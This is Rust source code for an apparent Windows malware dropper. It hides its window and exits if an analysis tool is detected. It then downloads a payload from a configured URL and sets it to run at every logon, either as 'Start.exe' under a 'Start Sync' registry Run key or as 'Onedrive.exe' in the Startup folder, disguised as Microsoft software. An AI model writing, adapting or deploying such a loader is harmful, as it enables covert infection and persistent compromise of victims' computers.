#![windows_subsystem = "windows"]
use constants::*;
use directories::UserDirs;
use std::{env::var_os, io::Cursor, process, process::Command, path::Path};
use winreg::enums::*;
use winreg::RegKey;
use antilysis;

mod constants;

type Result<T> = std::result::Result<T, Box<dyn std::error::Error + Send + Sync>>;

async fn download_payload(file_name: String) -> Result<()> {
    let url = DOWNLOAD_URL.to_string();
    let response = reqwest::get(url).await?;
    let mut file = std::fs::File::create(file_name)?;
    let mut content = Cursor::new(response.bytes().await?);
    std::io::copy(&mut content, &mut file)?;
    Ok(())
}

#[tokio::main]
async fn main() {
    if constants::ANTILYSIS && antilysis::detected() {
        process::exit(0);
    }

    if USE_REGISTRY {
        let user_dirs = UserDirs::new().unwrap();
        let homedir = user_dirs.home_dir().to_str().unwrap();
        let path = format!("{}{}", homedir, "\\AppData\\Local\\Start.exe");

        download_payload(path.to_string()).await.unwrap();

        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let reg_path = Path::new("Software")
            .join("Microsoft")
            .join("Windows")
            .join("CurrentVersion")
            .join("Run");
        let (key, _) = hkcu.create_subkey(&reg_path).unwrap();
        key.set_value("Start Sync", &path).unwrap();
        Command::new(path);
    } else {
        let test = var_os("APPDATA").unwrap();
        let appdata = test.to_str().unwrap();
        let right_path = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Onedrive.exe";
        let path = format!("{}{}", appdata, right_path);

        download_payload(path.to_string()).await.unwrap();
    }
}
